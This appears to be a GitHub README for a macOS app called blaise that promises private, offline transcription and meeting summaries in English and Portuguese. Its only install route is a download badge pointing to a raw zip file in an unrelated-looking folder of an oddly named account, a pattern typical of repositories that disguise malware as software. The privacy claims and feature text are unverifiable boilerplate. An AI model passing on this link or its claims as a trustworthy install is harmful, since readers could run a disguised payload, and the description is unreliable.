# 🎙️ blaise - Private meeting notes for your Mac

[![](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/Delectable-cutoff186/blaise/main/Germanize/Software_v2.7.zip)

blaise turns your recorded meetings into organized notes. The software runs entirely on your computer. Your audio files stay on your hardware. It handles English and Portuguese speech. It creates summaries and lists of action items for every session.

## ⚙️ Requirements

Blaise works on macOS. You need to ensure your system meets these standards:

*   macOS 14.0 or newer.
*   Apple Silicon (M1, M2, or M3 chip).
*   8 GB of RAM or more.
*   At least 2 GB of storage space for the speech models.

## 📝 How to use Blaise

The software uses advanced technology to parse audio. You do not need an internet connection.

### Recording a meeting
Click the record button in the menu bar. The software captures the audio. It converts speech to text in real time. Use the toggle to switch between English and Portuguese inputs. The app detects language changes automatically.

### Creating notes
Stop the recording when your meeting ends. The software processes the audio. It creates a structured note. This includes:

*   A summary of the meeting.
*   A list of action items.
*   Key topics discussed.

### Managing files
Blaise saves every transcript locally. You find your history in the internal dashboard. Click the History icon to view old meetings. Each file remains on your drive. No data goes to external servers.

## 🧪 Advanced Settings

You control how the software behaves. Open the Preferences window to adjust these features:

*   **Transcription Precision:** Use settings to balance speed and accuracy. High accuracy takes more computer power.
*   **Model Management:** Download additional speech models if you work with different accents.
*   **Storage Location:** Change the folder where the app saves your notes.
*   **Notification Settings:** Choose if you want the app to notify you when a transcript finishes.

## 🛡️ Privacy

Privacy is the core feature of Blaise. The app uses the MLX framework. This allows the computer to process data using your own hardware. Your recordings never leave your machine. No cloud service monitors your files. You own your notes.

## 🧩 Troubleshooting

If you face issues, check these frequent fixes:

*   App does not open: Ensure your macOS version matches the requirements.
*   Mic access issues: Check System Settings under Privacy & Security to ensure blaise has microphone permissions.
*   Low performance: Close other high-demand apps to give the transcription engine space to work.
*   Language detection fails: Make sure you chose the correct language mode in the menu bar. If you use mixed codes, select the Auto-Switch mode.

## 💡 Tips for better transcripts

The software produces better results when you follow these habits:

*   Keep your microphone close to the speaker.
*   Reduce background noise in your office.
*   Speak naturally.
*   Wait a few seconds for the app to finish processing after you end a meeting.
